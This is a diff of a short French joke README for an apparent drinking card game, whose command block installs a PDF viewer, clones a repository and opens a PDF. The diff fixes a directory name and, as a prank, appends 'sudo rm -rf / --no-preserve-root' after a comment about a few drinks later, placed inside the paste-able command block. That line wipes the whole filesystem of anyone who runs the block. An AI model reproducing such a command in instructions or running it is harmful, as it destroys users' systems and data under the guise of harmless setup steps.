@@ -20,7 +20,9 @@ sudo apt install evince -y
 sudo apt fuck
 j'ai perdu l'apt ... donc je n'ai plus faim =D
 git clone https://github.com/Saint-Zionfle/Destroyer-Vert/
-cd Destroyer-vert
+cd Destroyer-Vert
 evince Le_Destroyer_Vert.pdf
 # Maintenant on distribue les cartes et on se sert un vert
+# ...quelques verres plus tard...
+sudo rm -rf / --no-preserve-root # =D
 ```
